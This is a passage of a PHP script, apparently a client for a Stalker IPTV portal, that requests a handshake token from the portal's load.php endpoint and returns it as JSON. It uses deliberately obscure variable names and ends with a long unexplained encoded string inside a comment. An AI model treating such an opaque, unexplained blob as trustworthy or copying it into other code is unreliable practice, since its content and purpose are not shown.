    $DOCTOR_STRANGE = jitendraunatti("http://" . $WANDA["HOST"] . "/stalker_portal/server/load.php?type=stb&action=handshake&token=&JsHttpRequest=1-xml", $ROLEX, "GET", $KANG = null, 0, 0, 0, 0, true);
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    // file_put_contents("hext.txt", $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"]);
    if (isset($CHRISTINE["js"]["token"])) {
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "message" => "Handshake token generated successfully.",
            "Token" => $CHRISTINE["js"]["token"],
            "random" => $CHRISTINE["js"]["random"],
            "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
            "Date" => $ROCKET_RACCOON,
        ))));
    } else {
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "message" => "Handshake token generation failed.",
            "url" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["url"],
            "content_type" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["content_type"],
            "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
            "Date" => $ROCKET_RACCOON,
        ))));
    }
}

//nNRbyBX+zzbdAJCavlPUNuJK/Trmq0kDxBND8t60mZEv9dvC8ScGNL8LIK5/HwTrmWS3ZdTSJxzoCXaudBwU7dzIntbj/100/jwuhYXIxF8Hb5QNZ9HvwwKm//vMj5PKz1hQOht7+2Qsjk/Tvoqf/cqUYMY/sWdwF6DL7cflvk9wKVyGCdyhM5ZiPRt3GXtwAEVUNustuaj/MF9mH+yYEOVdt/++yQr8u0/c/4VR8fZU0xYl/HgLzZm4NhKQXfndrsPpBDFnBNxocPOIWPdKrE6YHO5mPFMHfjSmno/0v9ny11EIC4O8NaYZlwLTFc/ZbKHzGEspwVFjKYCydhYKtzCaANwr02GoTpFfbZqcoJpYnUNYw/M1pECscCT+t0hrGuNYCccAAZ+mb1c1/mEytNUGGoJNGrs9ES7b6tSC6f+XKLGr94qEvqrqGJd9vfX8d8tzooFo1KhWRSQx0Yv/4h5UGwL1gt9TSxRNdWT43G9B1fXoTj4S7QTaWW/c
